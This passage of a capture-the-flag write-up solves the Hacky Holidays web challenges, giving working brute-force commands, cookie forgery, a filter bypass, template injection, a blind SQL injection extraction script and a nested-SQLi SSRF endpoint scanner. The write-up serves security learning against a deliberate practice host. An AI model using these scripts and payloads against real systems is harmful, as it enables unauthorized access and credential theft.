10"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
11  ]
12}
Each decoded session is JSON object with two fields: user and cookie. In most of them, user value is null, and only one has not null user:
Code 238 Bytes
1{
2  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
4}
Now, when we found user id, we can try to send it to /api/user, but we don't know the parameter name. To find it, let's run gobuster again, but now in fuzz mode:
Code 146 Bytes
1$ gobuster fuzz -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 -w raft-small-words.txt -b 400 -t 50
And it will find the valid parameter name:
Code 123 Bytes
1Found: [Status=200] [Length=216] https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 will return the Grinch's user details in JSON format with the flag:
Code 229 Bytes
1{
2  "uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3  "username":"grinch",
4  "address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},
5  "flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
6}
The 4th flag flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}.
Secure Login
There is an app where we can log in. When we provide any username/password combination, server returns Invalid Username error message. I suppose, that server returns the different error messages for invalid username and password:
When username is invalid, the error message is Invalid Username.
When password is invalid, the error message is Invalid Password.
Using this information, let's run hydra tool to find the valid username, and using it, the valid password.
Code 366 Bytes
1# find username
2$ hydra -L ./names.txt -p pass hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:F=Invalid Username" -t 50 -I -f
3
4# find password for username `access`
5$ hydra -l access -P ./10k-most-common.txt hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:F=Invalid Password" -t 50 -I -f
hydra will find the valid credentials for us: access/computer.
Now, let's try to log in using them. The server will return securelogin cookie and the message in the body: No Files To Download. It seems that we haven't enough permissions to see the private data. Let's look at securelogin cookie. It's base64 encoded string: eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=, decoded value is json object: {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}. Let's change admin:false to admin:true and encode json to base64: eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==. Now we will curl the url again, using the new cookie:
Code 161 Bytes
1$ curl https://hackyholidays.h1ctf.com/secure-login -H "cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d"
The response body will contain a link to some secure zip file:
Code 87 Bytes
1<td><a href="/my_secure_files_not_for_you.zip">my_secure_files_not_for_you.zip</a></td>
Let's download it and try to open:
Code 110 Bytes
1$ wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip -O /tmp/data.zip && unzip /tmp/data.zip
The archive is protected by password. To find the password we will use John the Ripper tool:
Code 106 Bytes
1# create hash
2$ zip2john /tmp/data.zip > /tmp/data.zip.hashes
3# crack password
4$ john /tmp/data.zip.hashes
John will find the password: hahahaha. Now unzip archive using the found password:
Code 124 Bytes
1$ unzip sec-files.zip 
2Archive:  sec-files.zip
3[sec-files.zip] xxx.png password: 
4  inflating: xxx.png
5 extracting: flag.txt
And the flag will be in flag.txt file.
The 5th flag: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}.
My Diary
There is a calendar with Grinch's plans for December. The app url contains an interesting parameter ?template=entries.html. Looks like that Local/Remote file inclusion attack is possible here. Awesome! Let's read content of /etc/passwd... But we can't, the server redirects us to /my-diary/?template=entries.html in most of the cases. It seems that it removes some letters from the template value before reading the file.
Ok, then let's try to find the hidden files in the app, we will run gobuster in fuzz mode using the list of web-content files:
Code 111 Bytes
1$ gobuster fuzz -u https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ -t 50 -w raft-small-files.txt -b 302
gobuster will find index.php file with the following content:
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
Now we see, that server really deletes all chars except ASC II letters, numbers and dots. And also it has secretadmin.php page, and there is some protection from reading its content.
Let's look at str_replace php function. It replaces all occurrences of the pattern in the input string. So str_replace("admin.php", "", $page) will return an empty string for the input admin.php or admin.phpadmin.php, but, if we inject the second admin.php somewhere in admin.php, the result will be admin.php:
Code 141 Bytes
1echo str_replace("admin.php", "", "admin.php"); // returns ""
2echo str_replace("admin.php", "", "admiadmin.phpn.php"); // returns "admin.php"
To bypass the both conditions, we need to include admin.php and secretadmin.php twice, in the input string:
input string: secretadmisecretaadmin.phpdmin.phpn.php
after the first replace it becomes: secretadmisecretadmin.phpn.php
after the second replace it becomes: secretadmin.php
And https://hackyholidays.h1ctf.com/my-diary/?template=secretadmisecretaadmin.phpdmin.phpn.php returns the flag:
<image_0>
The 6th flag: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}.
Hate Mail Generator
In this app we can create (in fact we cannot:() and preview email campaigns. There is already created a single campaign with name Guess What.
Take a look at Guess What campaign:
name: Guess What
subject: Guess What...
markup: {{template:cbdj3_grinch_header.html}}Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
As we see, markup is written on some template language, there we can use fields from a dictionary, and include html templates via template: prefix followed by file name.
Cool, it looks pretty easy! We can read content of any file using {{template:<file-name>}} directive, right!? Let's read content of the magic flag.txt file!!! In fact we cannot:(! The server removes everything from file-name, except letters, numbers, dash, dot and underscore. And after that, adds the trimmed file-name to /templates/ path.
Let's check the content of /templates folder, besides of the two known templates: cbdj3_grinch_header.html and cbdj3_grinch_footer.html, it contains the very interesting file 38dhs_admins_only_header.html:
cbdj3_grinch_header.html
cbdj3_grinch_footer.html
38dhs_admins_only_header.html
The server doesn't allow read any of these files directly, and when we include 38dhs_admins_only_header.html in a new campaign markup, it returns an Access denied error. So we need to find another way how to read content of the admin template.
Let's look at new email campaign. It's impossible to create own campaign, the server returns an error message informing us about running out of credits. But we can preview our campaign. With the default data, the client sends two parameters in the body:
preview_markup: {{name}}
preview_data: {"name":"Alice","email":"alice@test.com"}
The template engine on the server uses our markup and dictionary. The most known server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed by server-side. Let's try to inject template engine directive {{template:}} into the template to bypass the access restrictions and read content of 38dhs_admins_only_header.html file.
Preview a new campaign with the following data:
markup: {{payload}}
data: {"payload":"{{template:38dhs_admins_only_header.html}}"}
And finally, the server returns the content of 38dhs_admins_only_header.html with the flag:
<image_1>
The 7th flag: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}.
Forum
There are some public and private posts in the forum app. The post with id=1 has two comments. Also there is /login page. We can't create own posts or add any comment to existing ones.
Let's run gobuster in dir mode to find the hidden pages:
Code 91 Bytes
1$ gobuster dir -u https://hackyholidays.h1ctf.com/forum -w raft-small-directories.txt -t 50
/login
/phpmyadmin
/1
/2
And we see new /phpmyadmin page here. Unfortunately for us (hackers), and fortunately for site creators:), we can't use bruteforce attack here to find the valid login/password combination. Both pages /login and /phpmyadmin return the universal error message when the credentials are incorrect: Username/Password Combination is invalid and Invalid username and password combination.
So what to do? Let's start from the beginning and check the challenge details on Twitter. The first comment contains information about the challenge creator - @adamtlangley. Googling this name, gives us the link to his GitHub account. There are two interesting repositories:
https://github.com/adamtlangley/framework
https://github.com/adamtlangley/stuff
The first one looks like a codebase for the current forum app. The second one is md5 cracker tool. This cracker tool was the wrong goal :(, I spent some time and found the encrypted password: 2901197737pepper for the provided hash, but it didn't work on both login pages.
So one hope to the framework repo. The latest commit doesn't have any interesting things. But there are some nice changes in the commit small fix:
Code 256 Bytes
1static public function read(){
2    if( gettype(self::$read) == 'string' ) {
3        - self::$read = new DbConnect( false, 'forum', 'forum', '6HgeAZ0qC9T6CQIqJpD' );
4        + self::$read = new DbConnect( false, '', '', '' );
5    }
6    return self::$read;
7}
It looks like, that forum and 6HgeAZ0qC9T6CQIqJpD are login/password for the forum and they were deleted in that commit.
Let's try to log in to /phpmyadmin using the found credentials.
Yes! We logged in successfully. In phpmyadmin we see forum database and four tables: comment, post, section and user:
<image_2>
We can't access almost all of them, except user:
Code 163 Bytes
1|id | username | password                         | admin
2|1  | grinch   | 35D652126CA1706B59DB02C93E0C9FBF | 1
3|2  | max      | 388E015BC43980947FCE0E5DB16481D1 |
The table contains two users, grinch is admin, the passwords are md5 hashes. We can try to use hashcat tool to find the password, but firstly, let's try to find it on the web by hash. And we see it here: https://md5.gromweb.com/?md5=35d652126ca1706b59db02c93e0c9fbf, the password is BahHumbug (it's on the line 365139 in rockyou.txt, but in the wrong case, no chances to bruteforce at all :))
Now, let's log in with grinch/BahHumbug on /login page. And finally we have access to the private, admin posts. There is only one post and it contains the flag:
<image_3>
The 8th flag: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}.
Evil Quiz
In this app we must provide a name and the answers to three questions, and the system will calculate our score and gives us a hint how many users there with the same name.
Let's check what app will return for the same unique name 1asdsa2asda32asdsa1ds32, posted twice (will clean cookies between posts). In the first case the number of the users with this name will be 0, in the second case 1. What does this mean? It means, that on the server side, there is a SQL query, that looks like: SELECT COUNT(*) FROM users WHERE name='input_name'. Maybe SQL injection is possible in this query? Let's check it, with the following payload: ' or 1=1 -- , the number of the users on the last step will be 40561! So the app is vulnerable to SQLi.
When we play a game, the client sends three mandatory requests in the following order:
POST /evil-quiz with name
POST /start with answers
GET /score
The requests must be send in the order shown above. Because of this, we can't use well known sqlmap tool, because these three requests must be send each after another, and the injection result is available only on the last step.
Let's create own python script that will dump database, and possibly, will give us username and password to log in. The algorithm of work looks like:
Send GET request to /evil-quiz to generate new cookies.
Send POST request to /evil-quiz with payload in name field.
Send POST request to /start with default answers.
Grep the response body for There is (\d+) other and select the number. If the value is greater than 0, then the injection result is positive.
To exclude the possible matches, we need to use the really random name jghuyqhfyxjgh123 to be sure that nobody is using it yet.
Let's create a few payloads. To get schema name, table names and table column names, we will use payload with case insensitive LIKE operator. To get password, we will use case sensitive LIKE BINARY operator. To decrease the number of requests, unused characters from the charset will be excluded.
Get schema name:
select count(*) from information_schema.schemata where schema_name != "information_schema" and schema_name like "' + tmp_known + '%" limit 1
select count(*) from information_schema.schemata where schema_name != "information_schema" and schema_name like "' + tmp_known + '%" limit 1
Get table name with users in schema quiz:
select count(*) from information_schema.tables where table_schema like "quiz" and table_name like "' + tmp_known + '%" limit 1
select count(*) from information_schema.tables where table_schema like "quiz" and table_name like "' + tmp_known + '%" limit 1
Get column names in the admin table:
select count(*) from information_schema.columns where table_schema like "quiz" and table_name="admin" and column_name like "' + tmp_known + '%" limit 1
`select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id") and column_name like "' + tmp_known + '%" limit 1
select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id","password") and column_name like "' + tmp_known + '%" limit 1
select count(*) from information_schema.columns where table_schema like "quiz" and table_name="admin" and column_name like "' + tmp_known + '%" limit 1
`select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id") and column_name like "' + tmp_known + '%" limit 1
select count(*) from information_schema.columns where table_schema like "quiz%" and table_name="admin" and column_name not in("id","password") and column_name like "' + tmp_known + '%" limit 1
Get record values in admin table:
select count(*) from quiz.admin where username like "' + tmp_known + '%" limit 1
`select count(*) from quiz.admin where username="admin" and password like binary "%' + temp_char + '%" limit 1
select count(*) from quiz.admin where username="admin" and password like binary "' + tmp_known + '%" limit 1
select count(*) from quiz.admin where username like "' + tmp_known + '%" limit 1
`select count(*) from quiz.admin where username="admin" and password like binary "%' + temp_char + '%" limit 1
select count(*) from quiz.admin where username="admin" and password like binary "' + tmp_known + '%" limit 1
Python script to dump db:
Code 1.97 KiB
1import requests as req
2import string
3import re
4
5QUIZ_URL = 'https://hackyholidays.h1ctf.com/evil-quiz'
6START_URL = 'https://hackyholidays.h1ctf.com/evil-quiz/start'
7POST_HEADERS = {
8  'Content-Type': 'application/x-www-form-urlencoded'
9}
10
11def send_sqli(query):
12  session = req.session()
13  session.get(QUIZ_URL) # to generate cookies
14  session.post(
15    QUIZ_URL,
16    headers=POST_HEADERS,
17    data={'name': 'jghuyqhfyxjgh123' + query}
18  )
19  res = session.post(
20    START_URL,
21    headers=POST_HEADERS,
22    data='ques_1=0&ques_2=0&ques_3=0'
23  )
24  count_match = re.search(r'There is (\d+) other', res.text)
25  if count_match:
26    return int(count_match.group(1)) > 0
27  print('Match not found')
28  exit(0)
29
30def get_charset():
31  charset = ''
32  base_charset = string.digits + string.ascii_letters + string.punctuation + ' '
33  for char in base_charset:
34    temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char
35
36    query = 'select count(*) from quiz.admin where username="admin" and password like binary "%' + temp_char + '%" limit 1'
37    query = '\' or ({}) = 1 -- '.format(query)
38    print(query)
39
40    if (send_sqli(query)):
41      charset += char
42      print(char)
43  return charset
44
45def get_data():
46  known = ''
47  known_max_len = 20
48  charset = get_charset()
49  print(charset)
50  while True:
51    found_next = False
52    for char in charset:
53      temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char
54      tmp_known = known + temp_char
55
56      query = 'select count(*) from quiz.admin where username="admin" and password like binary "' + tmp_known + '%" limit 1'
57      query = '\' or ({}) = 1 -- '.format(query)
58      print(query)
59
60      if (send_sqli(query)):
61        known += char
62        found_next = True
63        print(known)
64        break
65    if (not found_next):
66      print('Unable to find the next char, terminating')
67      exit(0)
68    elif (len(known) == known_max_len):
69      print('Found the first {} chars: {}'.format(known_max_len, known))
70      exit(0)
71
72get_data()
When all payloads will be executed, we will get the database dump:
Code 77 Bytes
1quiz
2  admin
3    id = 1
4    password = S3creT_p4ssw0rd-$
5    username = admin
Let's log in using the found credentials, and there will be the flag:
<image_4>
The 9th flag: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}.
Signup Manager
This app allows us to log in or signup. To sign up, we need to provide five parameters: username, password, age, firstname and lastname.
When we use existing username on signup, the server returns Username already exists error. When username is unique, the server creates a new user and returns the following page:
<image_5>
Login/password bruteforce attack is impossible here, because the server returns the universal error message when the credentials are incorrect.
Let's take a look at the source code of the main page. On the top line there is <!-- See README.md for assistance --> HTML comment. https://hackyholidays.h1ctf.com/signup-manager/README.md returns the following content:
Code 702 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5# How to Install
61. Create a directory that you wish SignUp Manager to be installed into
72. Move signupmanager.zip into the new directory and unzip it
83. For security move users.txt into a directory that cannot be read from website visitors
94. Update index.php with the location of your users.txt file
105. Edit the user and admin php files to display your hidden content
116. You can make anyone an admin by changing the last character in the users.txt file to a Y
127. Default login is admin / password
As we see, there is a small instruction how to install Signup Manager app. The users data is stored somewhere on the disk, and if the last character of the user record is Y, then this user is an admin. Also there is a name of zip archive signupmanager.zip. Let's try to download it. The archive contains a few files:
admin.php
index.php
user.php
signup.php
README.md
Let's look at index.php code. There are two functions: buildUsers and addUser.
buildUsers - loads all the users from the file into array, and for each string, creates a record with user details parsing this string. This function is calling on each request.
addUser - creates user string by a special format and adds it into the users file, sets the last letter of the string to N (not admin).
Code 1.37 KiB
1function buildUsers() {
2    $users = array();
3    $users_txt = file_get_contents('users.txt');
4    foreach( explode(PHP_EOL,$users_txt) as $user_str ) {
5        if(strlen($user_str) == 113) {
6            $username = str_replace('#', '', substr($user_str, 0, 15));
7            $users[$username] = array(
8                'username' => $username,
9                'password' => str_replace('#', '', substr($user_str, 15, 32)),
10                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
11                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
12                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
13                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
14                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
15            );
16        }
17    }
18    return $users;
19}
20
21function addUser($username,$password,$age,$firstname,$lastname) {
22    $random_hash = md5(print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand());
23    $line = '';
24    $line .= str_pad($username,15,"#");
25    $line .= $password;
26    $line .= $random_hash;
27    $line .= str_pad($age,3,"#");
28    $line .= str_pad($firstname,15,"#");
29    $line .= str_pad($lastname,15,"#");
30    $line .= 'N';
31    $line = substr($line,0,113);
32    file_put_contents('users.txt',$line.PHP_EOL,FILE_APPEND);
33    return $random_hash;
34}
If request contains cookie header, the app searches for an user record where user.cookie is equal to request.cookie.token. If user is found, the app redirects to /admin.php if user.admin is true, or to /user.php otherwise.
Code 291 Bytes
1$page = 'signup.php';
2if( isset($_COOKIE["token"]) ){
3    foreach( $all_users as $u ){
4        if( $u["cookie"] === $_COOKIE["token"] ){
5            if( $u["admin"] ){
6                $page = 'admin.php';
7            }else{
8                $page = 'user.php';
9            }
10        }
11    }
12}
Also there is a logic for processing login and signup actions.
on login action the app searches for user record where user.password is equal to password md5 hash from the body. If user is found, the app sets cookie and redirects to the main page.
on signup action the app validates five user fields:
removes non letters and numbers from username, firstname and lastname, validates that they have length less or equal to 15 letters.
creates md5 hash of the password.
validates that age is the number, its length is less or equal to 3 and converts its value to the number.
if there are no errors, the app calls addUser function, sets cookie token and redirects to the main page.
removes non letters and numbers from username, firstname and lastname, validates that they have length less or equal to 15 letters.
creates md5 hash of the password.
validates that age is the number, its length is less or equal to 3 and converts its value to the number.
if there are no errors, the app calls addUser function, sets cookie token and redirects to the main page.
Code 2.21 KiB
1if($page == 'signup.php') {
2    $errors = array();
3    if (isset($_POST["action"])) {
4        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
5            if( isset($all_users[ $_POST["username"] ]) ){
6                $u = $all_users[ $_POST["username"] ];
7                if( md5($_POST["password"]) === $u["password"] ){
8                    setcookie('token', $u["cookie"], time() + 3600);
9                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
10                    exit();
11                }
12            }
13            $errors[] = 'Username and password combination not found';
14        }
15        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
16            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
17            if (strlen($username) < 3) {
18                $errors[] = 'Username must by at least 3 characters';
19            } else {
20                if (isset($all_users[$username])) {
21                    $errors[] = 'Username already exists';
22                }
23            }
24            $password = md5($_POST["password"]);
25            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
26            if (strlen($firstname) < 3) {
27                $errors[] = 'First name must by at least 3 characters';
28            }
29            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
30            if (strlen($lastname) < 3) {
31                $errors[] = 'Last name must by at least 3 characters';
32            }
33            if (!is_numeric($_POST["age"])) {
34                $errors[] = 'Age entered is invalid';
35            }
36            if (strlen($_POST["age"]) > 3) {
37                $errors[] = 'Age entered is too long';
38            }
39            $age = intval($_POST["age"]);
40            if (count($errors) === 0) {
41                $cookie = addUser($username, $password, $age, $firstname, $lastname);
42                setcookie('token', $cookie, time() + 3600);
43                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
44                exit();
45            }
46        }
47    }
48}
Let's look at the user record string format:
username => max length 15, if less, left padded by #.
password => md5 hash, always has length 32 chars.
random_hash => md5 hash generated by random data, always has length 32 chars.
age => max length 3, if less, left padded by #.
firstname and lastname the same as username.
the last char: N.
Ok, so the goal is to create an user record string with such data, where the last letter will be Y (admin). The length of the string is 113 chars. We can't exceed the max length of username, firstname and lastname. The length of password and `random_hash is fixed. But what about age?
In PHP, the number can be presented in the different forms, and one of them is scientific notation: 1e1 equals to 10 in decimal form.
Let's look again how age is processed in signup action:
Code 185 Bytes
1if (!is_numeric($_POST["age"])) {
2    $errors[] = 'Age entered is invalid';
3}
4if (strlen($_POST["age"]) > 3) {
5    $errors[] = 'Age entered is too long';
6}
7$age = intval($_POST["age"]);
If age parameter value will be equal to 1e9, the both conditions will be passed, and in the end, the string 1e9 will be converted to the number 1000000000. Later, in the addUser function where the user record string is generated, the number 1000000000 will be converted to the string 1000000000.
We have done it! Now we can create a user record, where the last letter is Y.
username=johnsmith3
password=pass$%^&
age=1e9
firstname=john
lastname=smithYYYYYYYYYY
The generated user record string is:
Code 113 Bytes
1johnsmith3#####1a1dc91c907325c69271ddf0c944bc72ffd371da9900ca21d7c9aad6bc6f1bec1000000000john###########smithYYYY
Let's signup using the user details described above, and we will get the flag:
<image_6>
The 10th flag: flag{99309f0f-1752-44a5-af1e-a03e4150757d}.
Grinch Recon
When, we have solved the challenge 10, we are given the link to the challenge 11: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59.
There is a photo album app, with three albums and some photos in each album. There are two known and two hidden paths (we will get them with gobuster running it in dir mode: gobuster dir -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 -w raft-small-directories.txt -t 50):
/album?hash=hash
/picture?data=base64
/uploads
/api
/api
Returns a page with Grinch API HTTP status codes description for the different cases. When we are requesting any endpoint in /api, the response is {"error":"This endpoint cannot be visited from this IP address"}. Adding custom HTTP headers such as X-Forwarded, doesn't help, it seems that server validates the physical IP address of the client.
/uploads
We don't have access to the page, the server returns error 403.
/picture
Returns a picture, data parameter is a base64 encoded string. Let's look at this data value for example:
Code 160 Bytes
1eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
Decoded value is JSON object with two fields: image and auth:
Code 127 Bytes
1{
2  "image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg",
3  "auth":"bbf295d686bd2af346fcd80c5398de9a"
4}
image is the path to the picture, and the auth is some token, which looks like as md5 hash. Maybe there SSRF is possible? What if we can set own file path in image and generate auth for it? But unfortunately we can't. Looks like that server uses very long salt to generate md5 hash for image or maybe it's not md5 hash at all.
/album
And the last one path returns a page with album name and the pictures related to this album, hash parameter is a randomly generated string. I see only one attack that we can try here, it's SQL injection on hash parameter. Let's try a simple SQLi:
jdh34k' and 1=1 -- . returns the album page
jdh34k' and 1=0 -- . returns 404 status code!
Good, there is SQLi, let's run sqlmap to dump the database:
Code 109 Bytes
1$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k -p hash --dbms MySQL --dump
Well, we see there two tables: album and photo, but no users, admins, passwords... so the flag is not here :(.
Code 792 Bytes
1Table: album
2+----+--------+-----------+
3| id | hash   | name      |
4+----+--------+-----------+
5| 1  | 3dir42 | Xmas 2018 |
6| 2  | 59grop | Xmas 2019 |
7| 3  | jdh34k | Xmas 2020 |
8+----+--------+-----------+
9
10Table: photo
11+----+----------+--------------------------------------+
12| id | album_id | photo                                |
13+----+----------+--------------------------------------+
14| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
15| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
16| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
17| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
18| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
19| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
20+----+----------+--------------------------------------+
Let's check how many fields selected in the query, will use union attack for that:
' and 1=0 union select 1 -- . - error 404
' and 1=0 union select 1,2 -- . - error 404
' and 1=0 union select 1,2,3 -- . - album page
So the query selects three fields. Let's detect what fields are selected:
the 1st field is album.id, because when we change the value to 1, 2 or 3, the pictures from the different albums are loaded. When the value is 4, no pictures are loaded.
the 2nd field is unused on the page.
and the 3rd field is album.name.
Now let's imagine how the app selects the data:
1.I suppose there are two SQL queries, in the first one, the album record is selected and filtered by hash:
Code 39 Bytes
1select * from album
2where hash='{hash}'
2.In the second one, the photo record is selected and filtered by album_id. And album_id is used from the previous query.
Code 47 Bytes
1select * from photo
2where album_id='{album_id}'
If my thoughts are correct, then we can inject SQLi inside of SQLi, to select own picture path:
SQLi_2: ' and 1=0 union select 1,2,'our_path' -- .
SQLi_1: ' and 1=0 union select SQLi_2,2,3 -- .
Then the second SQL (which one selects the photos) will be:
Code 77 Bytes
1select * from photo
2where album_id='' and 1=0 union select 1,2,'our_path' -- 
It is impossible to inject the second SQLi as a string, it must be MySQL hexadecimal literal string, like as 0xf01a. Then the initial SQLi for the example above, will be:
Code 115 Bytes
1' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c276f75725f7061746827202d2d20,2,3 -- 
Using the information, lets try to get content of the main app page: /r3c0n_server_4fdk59, for example. As was described above, the path in image looks like: r3c0n_server_4fdk59/uploads/<picture file name>, so to get the content of /r3c0n_server_4fdk59, the injection path must be ../../ .
SQLi_2 as a string: ' and 1=0 union select 1,2,'../../' -- .
SQLi_2 in hexadecimal literal string format: 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20
SQLi_1: ' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3 --
Url: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20and%201=0%20union%20select%200x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3%20--%20
The server returns the album page with an unloaded image:
<image_7>
Code 193 Bytes
1<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC8uLlwvIiwiYXV0aCI6ImQyY2I0NDNlZmQxMDQyNDdkYjMzODU4NGY3YjI1MTk5In0=">
Decoded string for data (as mentioned above it's base64 encoded string) is JSON object {"image":"r3c0n_server_4fdk59\/uploads\/..\/..\/","auth":"d2cb443efd104247db338584f7b25199"}. Good, our injection works as expected. So we got SSRF and we can get content of some interesting pages on the server?
Let's open the url from image src:
Code 29 Bytes
1Invalid content type detected
Hmm, we expected something different, didn't we? Let's try to get content of other existing pages: https://hackyholidays.h1ctf.com or https://hackyholidays.h1ctf.com/robots.txt. Still the same error! But https://hackyholidays.h1ctf.com/assets/images/grinch-networks.png returns the image. So there is some logic on the server, which validates the response Content-Type header, and if it's not equal image/*, returns the error. But what the response will be for the not existing page? https://hackyholidays.h1ctf.com/not-existing:
Code 39 Bytes
1Expected HTTP status 200, Received: 404
Well, the server validates SSRF response status code and returns it in the own response. Do you remember about /api in the app? Let's look again at the Grinch API status codes description:
<image_8>
Using this table and the text in the response, we can bruteforce wordlist of most popular endpoints and find the valid API endpoints.
Let's create python script to find API endpoints:
Code 1.14 KiB
1import requests as req
2import string
3from urllib.parse import urlencode, quote
4import re
5
6URL = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59'
7
8def get_endpoints():
9  with open('objects-lowercase.txt', 'r') as f:
10    endpoint = f.readline()
11    while endpoint:
12      endpoint = endpoint.lower().strip()
13      res = send_sqli(endpoint)
14      if res:
15        print('{} => {}, {}'.format(endpoint, res['status_code'], res['text']))
16      endpoint = f.readline()
17
18def send_sqli(payload):
19  print(payload)
20  query = "' and 1=0 union select 1,2,'../api/{}' -- ".format(payload).encode('utf-8').hex()
21  params = {
22    'hash': "?hash='and 1=0 union select 0x{},2,3 -- ".format(query)
23  }
24  res = req.get(URL + '/album', params=params)
25  match = re.search(r'/picture\?data=([A-Za-z0-9=]+)', res.text)
26  if match:
27    return call_api(match.group(1))
28  print_and_exit('Empty response for ' + payload)
29
30def call_api(data):
31  res = req.get(URL + '/picture?data=' + data)
32  if (not re.search(r'Received: 404', res.text)):
33    return {
34      'status_code': res.status_code,
35      'text': res.text
36    }
37
38def print_and_exit(message):
39  print(message)
40  exit(0)
41
42get_endpoints()
